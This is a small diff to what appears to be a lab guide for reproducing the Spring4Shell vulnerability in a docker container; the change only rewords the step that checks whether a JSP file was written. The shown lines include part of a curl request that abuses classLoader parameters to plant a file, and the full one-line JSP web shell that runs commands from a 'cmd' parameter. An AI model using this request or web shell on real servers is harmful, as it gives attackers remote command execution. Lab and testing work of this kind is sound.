@@ -27,7 +27,7 @@ curl --request POST \
   --data class.module.classLoader.resources.context.parent.pipeline.first.prefix=springshell \
   --data class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
 ```
-3. Review jsp content:
+3. If springshell.jsp is created, review jsp content:
 `docker exec -it springshell bash -c "cd webapps/ROOT;cat springshell.jsp"` will display
 `<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %>//`
 _This means the application is compromised_
